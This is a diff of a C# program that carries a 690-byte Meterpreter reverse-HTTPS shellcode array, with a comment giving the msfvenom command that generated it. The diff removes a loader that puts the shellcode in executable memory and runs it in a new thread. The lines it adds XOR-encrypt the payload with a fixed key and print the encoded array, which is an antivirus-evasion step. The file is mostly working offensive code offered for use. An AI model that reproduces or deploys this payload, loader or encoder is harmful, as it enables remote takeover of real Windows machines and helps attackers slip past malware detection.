@@ -1,32 +1,29 @@
 using System;
-using System.Runtime.InteropServices;
+using System.IO;
+using System.Text;
 
-class Program
+
+public class Program
 {
 
-    //https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
-    [DllImport("kernel32")]
-    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+    private static byte[] xor(byte[] cipher, byte[] key)
+    {
 
-    //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
-    [DllImport("kernel32")]
-    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
+        byte[] xored = new byte[cipher.Length];
 
-    //https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
-    [DllImport("kernel32")]
-    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+        for (int i = 0; i < cipher.Length; i++)
+        {
+            xored[i] = (byte)(cipher[i] ^ key[i % key.Length]);
+        }
 
-    private static UInt32 MEM_COMMIT = 0x1000;
-    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+        return xored;
+    }
 
 
     static void Main()
     {
-        IntPtr threatHandle = IntPtr.Zero;
-        UInt32 threadId = 0;
-        IntPtr parameter = IntPtr.Zero;
+        string key = "ABCDE";
 
-        // msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=YOUR_IP LPORT=8080 -f csharp
         byte[] shellcode = new byte[690] {
             0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
             0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
@@ -75,16 +72,27 @@ class Program
             0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x07,0x48,0x01,0xc3,0x85,0xc0,0x75,0xd2,
             0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };
 
+            byte[] xorshellcode;
 
+            xorshellcode = xor(shellcode, Encoding.ASCII.GetBytes(key));
+            StringBuilder newshellcode = new StringBuilder();
+            newshellcode.Append("byte[] shellcode = new byte[");
+            newshellcode.Append(xorshellcode.Length);
+            newshellcode.Append("] { ");
+            for (int i = 0; i < xorshellcode.Length; i++)
+            {
+                newshellcode.Append("0x");
+                newshellcode.AppendFormat("{0:x2}", xorshellcode[i]);
+                if (i < xorshellcode.Length - 1)
+                {
+                    newshellcode.Append(", ");
+                }
 
-            UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-            Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);
-            threatHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
-            WaitForSingleObject(threatHandle, 0xFFFFFFFF);
+            }
+            newshellcode.Append(" };");
+            Console.WriteLine(newshellcode.ToString());
+
 
             return;
         }
     }
-
-
-
